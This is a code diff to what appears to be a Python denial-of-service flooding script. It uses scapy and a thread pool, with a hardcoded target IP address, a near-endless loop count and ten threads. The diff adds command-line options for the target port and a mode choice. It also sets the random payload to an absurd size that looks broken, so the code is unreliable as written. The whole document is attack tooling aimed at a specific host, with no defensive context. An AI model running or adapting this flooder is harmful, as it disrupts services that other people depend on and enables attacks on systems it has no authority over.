@@ -6,15 +6,18 @@ import argparse
 from scapy.all import *
 from multiprocessing.dummy import Pool as ThreadPool
 
-
+parser = argparse.ArgumentParser()
+parser.add_argument('-port', help = 'target port')
+parser.add_argument('-choice', help = 'user')
+args = parser.parse_args()
 
 ip = '82.200.161.178'
-port = 123
-choice = '1'
+port = int(args.port)
+choice = args.choice
 times = 10000000000
 threads = 10
 def run(a):
-	data = random._urandom(1024)
+	data = random._urandom(1000000000000000*11024)
 	i = random.choice(("[/]","[__]","[/]"))
 	while True:
 		try:
